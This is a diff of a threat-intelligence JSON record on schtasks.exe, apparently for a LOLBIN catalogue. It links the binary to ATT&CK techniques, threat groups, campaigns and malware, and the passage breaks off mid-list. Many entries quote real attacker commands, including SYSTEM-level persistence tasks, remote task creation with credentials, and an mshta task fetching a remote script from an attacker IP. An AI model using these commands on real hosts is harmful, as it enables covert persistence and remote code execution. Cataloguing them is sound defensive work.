@@ -1,206 +1,1395 @@
 {
   "type": "lolbin",
-  "version": 1,
+  "version": 2,
   "id": "3c4835bc-18e4-4baf-8c05-fff90a08498b",
   "created_by_ref": "@Nounou_Mbeiri",
-  "created": "2023-11-11T00:00",
-  "modified": "2023-11-1117T00:00",
-  "name": "schtasks[.]exe",
+  "created": "2023-11-11T00:00:00.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
+  "name": "schtasks.exe",
+  "image": "schtasks.exe",
   "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
-  "Required_privilege": [
+  "attack": {
+    "id": "S0111",
+    "name": "schtasks",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0111",
+    "version": "20.0"
+  },
+  "summary": [
+    "Achieved persistence via scheduled tasks",
+    "Created a scheduled SYSTEM task that runs when a user logs in",
+    "Run programs at system startup",
+    "Run malicious scripts on a compromised host (.vbe, .dat)",
+    "Downloaded additional malware including Cobalt Strike, PowerShell loader",
+    "Execute malware during lateral movement",
+    "Bypass UAC",
+    "Maintain RDP backdoors"
+  ],
+  "required_privileges": [
     "User"
   ],
   "paths": [
     "c:\\windows\\system32\\schtasks.exe",
     "c:\\windows\\syswow64\\schtasks.exe"
   ],
-  "hashe": "27304B246C7D5B4E149124D5F93C5B01",
-  "associated_kill_chain_phases": [
-    "TA0002:Execution:T1053.005",
-    "TA0003:Persistence:T1053.005",
-    "TA0004:Privilege Escalation:T1053.005"
-  ],
+  "hashes": {
+    "MD5": "27304B246C7D5B4E149124D5F93C5B01"
+  },
   "capabilities": [
     "Execute",
     "UAC bypass"
   ],
-  "relationship": [
-    {
-      "associated_apts": [
-        "APT41",
-        "Cobalt Group",
-        "FIN10",
-        "menuPass",
-        "FIN13",
-        "APT3",
-        "Rancor",
-        "FIN6",
-        "Blue Mockingbird",
-        "Machete",
-        "Higaisa",
-        "Stealth Falcon",
-        "OilRig",
-        "Magic Hound",
-        "Kimsuky",
-        "TEMP.Veles",
-        "APT37",
-        "GALLIUM",
-        "Patchwork",
-        "BRONZE BUTLER",
-        "Wizard Spider",
-        "TA2541",
-        "Molerats",
-        "Gamaredon Group",
-        "LuminousMoth",
-        "Chimera",
-        "HEXANE",
-        "Dragonfly",
-        "Lazarus Group",
-        "APT-C-36"
-      ],
-      "Relationship Campaigns->Tool": [
-        "During [Frankenstein](https://attack.mitre.org/campaigns/C0001), the threat actors established persistence through a scheduled task using the command: `/Create /F /SC DAILY /ST 09:00 /TN WinUpdate /TR`, named \"WinUpdate\" (Citation: Talos Frankenstein June 2019)",
-        "During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) used the following Windows scheduled tasks for DEADEYE dropper persistence on US state government networks: `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility`, `\\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`.(Citation: Mandiant APT41) ",
-        "During [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.`(Citation: Cybereason OperationCuckooBees May 2022)",
-        "During the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024), [APT29](https://attack.mitre.org/groups/G0016) used `scheduler` and `schtasks` to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. [APT29](https://attack.mitre.org/groups/G0016) also created a scheduled task to maintain [SUNSPOT](https://attack.mitre.org/software/S0562) persistence when the host booted.(Citation: Volexity SolarWinds)(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: CrowdStrike SUNSPOT Implant January 2021)",
-        "During [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors used scheduled tasks to execute malicious PowerShell code on remote systems.(Citation: FoxIT Wocao December 2019)",
-        "During [Operation Dream Job](https://attack.mitre.org/campaigns/C0022), [Lazarus Group](https://attack.mitre.org/groups/G0032) created scheduled tasks to set a periodic execution of a remote XSL script.(Citation: ESET Lazarus Jun 2020)",
-        "During [CostaRicto](https://attack.mitre.org/campaigns/C0004), the threat actors used scheduled tasks to download backdoor tools.(Citation: BlackBerry CostaRicto November 2020) "
-      ],
-      "associated_campaigns": [
-        "Iranian IRGC Data Extortion Operations",
-        "Operation Dream Job",
-        "CostaRicto",
-        "Operation Wocao",
-        "Frankenstein",
-        "2023 Zoho ManageEngine APT Exploits",
-        "SolarWinds Compromise",
-        "Iranian APT Credential Harvesting & Cryptomining Activity",
-        "C0017",
-        "Operation CuckooBees"
-      ],
-      "Associated_Malware": [
-        "SharpDisco",
-        "Matryoshka",
-        "Agent Tesla",
-        "Carbon",
-        "BADNEWS",
-        "Tarrask",
-        "Helminth",
-        "BabyShark",
-        "JHUHUGIT",
-        "SQLRat",
-        "DarkWatchman",
-        "Duqu",
-        "Smoke Loader",
-        "Emotet",
-        "NotPetya",
-        "Shamoon",
-        "AppleJeus",
-        "Saint Bot",
-        "HermeticWiper",
-        "Goopy",
-        "Sibot",
-        "Tomiris",
-        "zwShell",
-        "Gazer",
-        "Lokibot",
-        "Bad Rabbit",
-        "LitePower",
-        "IcedID",
-        "DanBot",
-        "ISMInjector",
-        "Revenge RAT",
-        "BackConfig",
-        "Meteor",
-        "Stuxnet",
-        "HotCroissant",
-        "Attor",
-        "QUADAGENT",
-        "Valak",
-        "JSS Loader",
-        "POWERSTATS",
-        "NETWIRE",
-        "Dyre",
-        "TrickBot",
-        "Pteranodon",
-        "Ryuk",
-        "GravityRAT",
-        "ComRAT",
-        "Bumblebee",
-        "QakBot",
-        "yty",
-        "EvilBunny",
-        "SharpStage",
-        "ServHelper",
-        "CozyCar",
-        "Zebrocy",
-        "ZxxZ",
-        "Ramsay",
-        "Disco",
-        "Lucifer",
-        "RainyDay",
-        "SoreFang"
-      ],
-      "associated_commands": [
-        "Schtasks.exe /Create /TN \"UpdatesxjZWstBWrIuw\" /XML C:UsersxxxxxxAppDataLocalTemptmp1718.tmp",
-        "schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\"",
-        "schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download microsoftp.jpg\\\">code close</script>'\" /mo 15 /F",
-        "SCHTASKS  /Change  /tn \"\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor\" /TR \"C:\\windows\\system32\\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\\windows\\system32\\msiexec.exe /Z c:\\programdata\\S-1-5-18.dat\" /RL HIGHEST /RU \"\" /ENABLE",
-        "schtasks /create /s <remote host> /u “<user>” /p “<password>” /ru “SYSTEM” /tn one /sc MONTHLY /tr “c:\\ users\\public\\filepak.exe 20191101” /F",
-        "schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st",
-        "schtasks.exe\" /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR \"c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe"
-      ],
-      "pre_and_next_related_cmd": [
-        {
-          "pre_cmd_event": [
-            "C:\\Windows\\system32\\cmd.exe /c \"copy c:\\users\\public\bin\filepak.exe \\<remote host>\\c$\\users\\public\\ /Y"
-          ],
-          "next_cmd_event": []
-        }
-      ]
-    }
-  ],
   "platforms": [
     "windows"
   ],
-  "detections": [
+  "associated_kill_chain_phases": [
+    "TA0002:Execution:T1053.005",
+    "TA0003:Persistence:T1053.005",
+    "TA0004:Privilege Escalation:T1053.005",
+    "TA0005:Stealth:T1036.004"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT3",
+        "attack_id": "G0022",
+        "evidence": "uses S0111; names schtasks.exe",
+        "description": "An APT3 downloader creates persistence by creating the following scheduled task: schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON /ru \"System\".",
+        "sources": "FireEye Operation Double Tap https://www.fireeye.com/blog/threat-research/2014/11/operation_doubletap.html"
+      },
+      {
+        "name": "BianLian Ransomware Group",
+        "attack_id": null,
+        "evidence": "reported by CISA AA23-136A BianLian Ransomware Group May 2023",
+        "description": "BianLian group actors used a Scheduled Task run as SYSTEM (the highest privilege Windows accounts) to execute a Dynamic Link Library (DLL) file daily. schtasks.exe /RU SYSTEM /create /sc ONCE /<user> /tr \"cmd.exe /crundll32.exe c:\\programdata\\netsh.dll,Entry\" /ST 04:43",
+        "sources": "CISA AA23-136A BianLian Ransomware Group May 2023 https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a"
+      },
+      {
+        "name": "BlackCat Ransomware Actors & Affiliates",
+        "attack_id": null,
+        "evidence": "reported by Cisco Talos BlackMatter to BlackCat March 2022",
+        "description": "During the BlackCat attack, the actors used a tool called [reverse-ssh] ... c:\\windows\\system32\\schtasks.exe /create /ru system /sc minute /tn microsoft\\windows\\wininet\\cachetask /tr c:\\:cachetask -b <bind port> /f",
+        "sources": "Cisco Talos BlackMatter to BlackCat March 2022 https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/"
+      },
+      {
+        "name": "BRONZE BUTLER",
+        "attack_id": "G0060",
+        "evidence": "uses S0111; names schtasks.exe",
+        "description": "BRONZE BUTLER has used schtasks to register a scheduled task to execute malware during lateral movement.",
+        "sources": "Secureworks BRONZE BUTLER Oct 2017 https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
+      },
+      {
+        "name": "Chimera",
+        "attack_id": "G0114",
+        "evidence": "names schtasks.exe",
+        "description": "Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st and to maintain persistence.",
+        "sources": "Cycraft Chimera April 2020 https://web.archive.org/web/20231214094657/https://cycraft.com/download/CyCraft-Whitepaper-Chimera_V4.1.pdf; NCC Group Chimera January 2021 https://web.archive.org/web/20230218064220/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/"
+      },
+      {
+        "name": "Earth Lusca",
+        "attack_id": "G1006",
+        "evidence": "names schtasks.exe",
+        "description": "Earth Lusca used the command schtasks /Create /SC ONLOgon /TN WindowsUpdateCheck /TR “[file path]” /ru system for persistence.",
+        "sources": "TrendMicro EarthLusca 2022 https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "uses S0111"
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": "names schtasks.exe",
+        "description": "Lazarus Group has used schtasks for persistence including through the periodic execution of a remote XSL script or a dropped VBS payload.",
+        "sources": "ESET Twitter Ida Pro Nov 2021 https://x.com/ESETresearch/status/1458438155149922312; Qualys LolZarus https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns"
+      },
+      {
+        "name": "Naikon",
+        "attack_id": "G0019",
+        "evidence": "names schtasks.exe",
+        "description": "Naikon has used schtasks.exe for lateral movement in compromised networks.",
+        "sources": "Bitdefender Naikon April 2021 https://www.bitdefender.com/files/News/CaseStudies/study/396/Bitdefender-PR-Whitepaper-NAIKON-creat5397-en-EN.pdf"
+      },
+      {
+        "name": "Rancor",
+        "attack_id": "G0075",
+        "evidence": "names schtasks.exe",
+        "description": "Rancor launched a scheduled task to gain persistence using the schtasks /create /sc command.",
+        "sources": "Rancor Unit42 June 2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "C0017",
+        "attack_id": "C0017",
+        "evidence": "names schtasks.exe",
+        "description": "During C0017, APT41 used `SCHTASKS /Change` to modify legitimate scheduled tasks to run malicious code.",
+        "sources": "Mandiant APT41 https://www.mandiant.com/resources/apt41-us-state-governments"
+      },
+      {
+        "name": "Operation CuckooBees",
+        "attack_id": "C0012",
+        "evidence": "names schtasks.exe",
+        "description": "During Operation CuckooBees, the threat actors used scheduled tasks to execute batch scripts for lateral movement with the following command: `SCHTASKS /Create /S <IP Address> /U <Username> /p <Password> /SC ONCE /TN test /TR <Path to a Batch File> /ST <Time> /RU SYSTEM.`",
+        "sources": "Cybereason OperationCuckooBees May 2022 https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques"
+      },
+      {
+        "name": "SolarWinds Compromise",
+        "attack_id": "C0024",
+        "evidence": "names schtasks.exe",
+        "description": "During the SolarWinds Compromise, APT29 used `scheduler` and `schtasks` to create new tasks on remote host as part of their lateral movement. They manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration. APT29 also created a scheduled task to maintain SUNSPOT persistence when the host booted.",
+        "sources": "Volexity SolarWinds https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/; CrowdStrike SUNSPOT Implant January 2021 https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/; FireEye SUNBURST Backdoor December 2020 https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "BADHATCH",
+        "attack_id": "S1081",
+        "evidence": "names schtasks.exe",
+        "description": "BADHATCH can use `schtasks.exe` to gain persistence.",
+        "sources": "BitDefender BADHATCH Mar 2021 https://www.bitdefender.com/files/News/CaseStudies/study/394/Bitdefender-PR-Whitepaper-BADHATCH-creat5237-en-EN.pdf"
+      },
+      {
+        "name": "CLAIMLOADER",
+        "attack_id": "S1236",
+        "evidence": "names schtasks.exe",
+        "description": "CLAIMLOADER has created scheduled tasks that execute the loader every five(5) minutes using `schtasks /F /Create /TN \\\"<fake_software_name>\\\" /SC minute /MO 5 /TR \\\"C:\\ProgramData\\<path_to_exe> <hardcoded_argument>\\`.",
+        "sources": "2025_IBM_PUBLOAD_TONESHELL_HIUPAN_CLAIMLOADER_MUSTANG PANDA https://www.ibm.com/think/x-force/hive0154-targeting-us-philippines-pakistan-taiwan"
+      },
+      {
+        "name": "CorKLOG",
+        "attack_id": "S1235",
+        "evidence": "names schtasks.exe",
+        "description": "CorKLOG has achieved persistence through the creation of a scheduled task named TableInputServices by using the command `schtasks /create /tn TabletlnputServices /tr /sc minute /mo 10 /f`.",
+        "sources": "Zscaler PAKLOG CorkLog SplatCloak Splatdropper April 2025 https://www.zscaler.com/blogs/security-research/latest-mustang-panda-arsenal-paklog-corklog-and-splatcloak-p2"
+      },
+      {
+        "name": "DEADEYE",
+        "attack_id": "S1052",
+        "evidence": "names schtasks.exe",
+        "description": "DEADEYE has used `schtasks /change` to modify scheduled tasks including `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`.",
+        "sources": "Mandiant APT41 https://www.mandiant.com/resources/apt41-us-state-governments"
+      },
+      {
+        "name": "Lokibot",
+        "attack_id": "S0447",
+        "evidence": "names schtasks.exe",
+        "description": "Lokibot embedded the commands schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I inside a batch script.",
+        "sources": "Talos Lokibot Jan 2021 https://blog.talosintelligence.com/2021/01/a-deep-dive-into-lokibot-infection-chain.html"
+      },
+      {
+        "name": "Lucifer",
+        "attack_id": "S0532",
+        "evidence": "names schtasks.exe",
+        "description": "Lucifer has established persistence by creating the following scheduled task schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\\%USERPROFILE%\\Downloads\\spread.exe /F.",
+        "sources": "Unit 42 Lucifer June 2020 https://unit42.paloaltonetworks.com/lucifer-new-cryptojacking-and-ddos-hybrid-malware/"
+      },
+      {
+        "name": "POWERSTATS",
+        "attack_id": "S0223",
+        "evidence": "names schtasks.exe",
+        "description": "POWERSTATS has established persistence through a scheduled task using the command ”C:\\Windows\\system32\\schtasks.exe” /Create /F /SC DAILY /ST 12:00 /TN MicrosoftEdge /TR “c:\\Windows\\system32\\wscript.exe C:\\Windows\\temp\\Windows.vbe”.",
+        "sources": "ClearSky MuddyWater Nov 2018 https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf"
+      },
+      {
+        "name": "PUBLOAD",
+        "attack_id": "S1228",
+        "evidence": "names schtasks.exe",
+        "description": "PUBLOAD has created scheduled tasks to maintain persistence with the command `schtasks.exe /F /Create /TN Microsoft_Licensing /sc minute /MO 1 /TR C:\\Users\\Public\\Libraries\\...`",
+        "sources": "Cisco Talos MUSTANG PANDA PLUGX PUBLOAD MAY 2022 https://blog.talosintelligence.com/mustang-panda-targets-europe/; Lab52 MUSTANG PANDA PUBLOAD MAY 2023 https://lab52.io/blog/new-mustang-pandas-campaing-against-australia/; 2022 November_TrendMicro_Earth Preta_Toneshell_Pubload https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html"
+      },
+      {
+        "name": "ServHelper",
+        "attack_id": "S0382",
+        "evidence": "names schtasks.exe",
+        "description": "ServHelper contains modules that will use schtasks to carry out malicious operations.",
+        "sources": "Proofpoint TA505 Jan 2019 https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505"
+      },
+      {
+        "name": "Tarrask",
+        "attack_id": "S1011",
+        "evidence": "names schtasks.exe",
+        "description": "Tarrask may abuse the Windows schtasks command-line tool to create \"hidden\" scheduled tasks.",
+        "sources": "Tarrask scheduled task https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/"
+      },
+      {
+        "name": "The Gentlemen Ransomware",
+        "attack_id": "S9051",
+        "evidence": "names schtasks.exe",
+        "description": "The Gentlemen Ransomware has leveraged scheduled tasks to execute itself as system. The Gentlemen Ransomware has also established persistence through the creation of scheduled tasks to include `schtasks /Create /SC ONSTART /TN UpdateSystem /TR “<malware_path>” /RU SYSTEM` and `schtasks /Create /SC ONSTART /TN UpdateUser /TR “<malware_path>”`. The Gentlemen Ransomware has deleted pre-existing scheduled tasks using `schtasks /Delete /TN UpdateSystem /F` and `schtasks /Delete /TN UpdateUser /F`.",
+        "sources": "CarveyODonnellWelchHuntress_TheGentlemen_May2026 https://www.huntress.com/blog/the-gentlemen-ransomware-defense-evasion-ttps; CheckPointResearch_TheGentlemen_April2026 https://research.checkpoint.com/2026/dfir-report-the-gentlemen/; MSTI_GentelmenRansomware_May2026 https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/"
+      },
+      {
+        "name": "Tomiris",
+        "attack_id": "S0671",
+        "evidence": "names schtasks.exe",
+        "description": "Tomiris has used `SCHTASKS /CREATE /SC DAILY /TN StartDVL /TR \"[path to self]\" /ST 10:00` to establish persistence.",
+        "sources": "Kaspersky Tomiris Sep 2021 https://securelist.com/darkhalo-after-solarwinds-the-tomiris-connection/104311/"
+      },
+      {
+        "name": "yty",
+        "attack_id": "S0248",
+        "evidence": "names schtasks.exe",
+        "description": "yty establishes persistence by creating a scheduled task with the command SchTasks /Create /SC DAILY /TN BigData /TR “ + path_file + “/ST 09:30“.",
+        "sources": "ASERT Donot March 2018 https://www.arbornetworks.com/blog/asert/donot-team-leverages-new-modular-malware-framework-south-asia/"
+      },
+      {
+        "name": "zwShell",
+        "attack_id": "S0350",
+        "evidence": "names schtasks.exe",
+        "description": "zwShell has used SchTasks for execution.",
+        "sources": "McAfee Night Dragon https://scadahacker.com/library/Documents/Cyber_Events/McAfee%20-%20Night%20Dragon%20-%20Global%20Energy%20Cyberattacks.pdf"
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "CSPY Downloader",
+        "attack_id": "S0527",
+        "evidence": "names schtasks.exe",
+        "description": "CSPY Downloader can use the schtasks utility to bypass UAC.",
+        "sources": "Cybereason Kimsuky November 2020 https://www.cybereason.com/blog/back-to-the-future-inside-the-kimsuky-kgh-spyware-suite"
+      }
+    ],
+    "technique_only": [
+      {
+        "name": "APT-C-36",
+        "attack_id": "G0099",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "APT29",
+        "attack_id": "G0016",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "APT32",
+        "attack_id": "G0050",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "APT33",
+        "attack_id": "G0064",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "APT37",
+        "attack_id": "G0067",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "APT39",
+        "attack_id": "G0087",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "BITTER",
+        "attack_id": "G1002",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Blue Mockingbird",
+        "attack_id": "G0108",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Cobalt Group",
+        "attack_id": "G0080",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Confucius",
+        "attack_id": "G0142",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Dragonfly",
+        "attack_id": "G0035",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "FIN10",
+        "attack_id": "G0051",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "FIN13",
+        "attack_id": "G1016",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "FIN6",
+        "attack_id": "G0037",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "FIN7",
+        "attack_id": "G0046",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "FIN8",
+        "attack_id": "G0061",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Fox Kitten",
+        "attack_id": "G0117",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "GALLIUM",
+        "attack_id": "G0093",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "HEXANE",
+        "attack_id": "G1001",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Higaisa",
+        "attack_id": "G0126",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "LuminousMoth",
+        "attack_id": "G1014",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Magic Hound",
+        "attack_id": "G0059",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "menuPass",
+        "attack_id": "G0045",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Molerats",
+        "attack_id": "G0021",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "MuddyWater",
+        "attack_id": "G0069",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Mustang Panda",
+        "attack_id": "G0129",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "OilRig",
+        "attack_id": "G0049",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Silence",
+        "attack_id": "G0091",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Stealth Falcon",
+        "attack_id": "G0038",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "TA2541",
+        "attack_id": "G1018",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Wizard Spider",
+        "attack_id": "G0102",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "CostaRicto",
+        "attack_id": "C0004",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Frankenstein",
+        "attack_id": "C0001",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Operation Dream Job",
+        "attack_id": "C0022",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Operation Wocao",
+        "attack_id": "C0014",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Agent Tesla",
+        "attack_id": "S0331",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Anchor",
+        "attack_id": "S0504",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "AppleJeus",
+        "attack_id": "S0584",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Attor",
+        "attack_id": "S0438",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "BabyShark",
+        "attack_id": "S0414",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "BackConfig",
+        "attack_id": "S0475",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Bad Rabbit",
+        "attack_id": "S0606",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "BADNEWS",
+        "attack_id": "S0128",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Bazar",
+        "attack_id": "S0534",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "BONDUPDATER",
+        "attack_id": "S0360",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Bumblebee",
+        "attack_id": "S1039",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Carbon",
+        "attack_id": "S0335",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "ccf32",
+        "attack_id": "S1043",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "ComRAT",
+        "attack_id": "S0126",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "CosmicDuke",
+        "attack_id": "S0050",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "CozyCar",
+        "attack_id": "S0046",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Crutch",
+        "attack_id": "S0538",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "DanBot",
+        "attack_id": "S1014",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "DarkWatchman",
+        "attack_id": "S0673",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Duqu",
+        "attack_id": "S0038",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Dyre",
+        "attack_id": "S0024",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Emotet",
+        "attack_id": "S0367",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "EvilBunny",
+        "attack_id": "S0396",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Gazer",
+        "attack_id": "S0168",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "GoldMax",
+        "attack_id": "S0588",
+        "evidence": "uses technique T1053.005 (v1 research); uses technique T1036.004 (v1 research)"
+      },
+      {
+        "name": "Goopy",
+        "attack_id": "S0477",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "GravityRAT",
+        "attack_id": "S0237",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "GRIFFON",
+        "attack_id": "S0417",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "GrimAgent",
+        "attack_id": "S0632",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "Helminth",
+        "attack_id": "S0170",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "HermeticWiper",
+        "attack_id": "S0697",
+        "evidence": "uses technique T1053.005 (v1 research)"
+      },
+      {
+        "name": "HotCroissant",
+        "attack_id": "S0431",
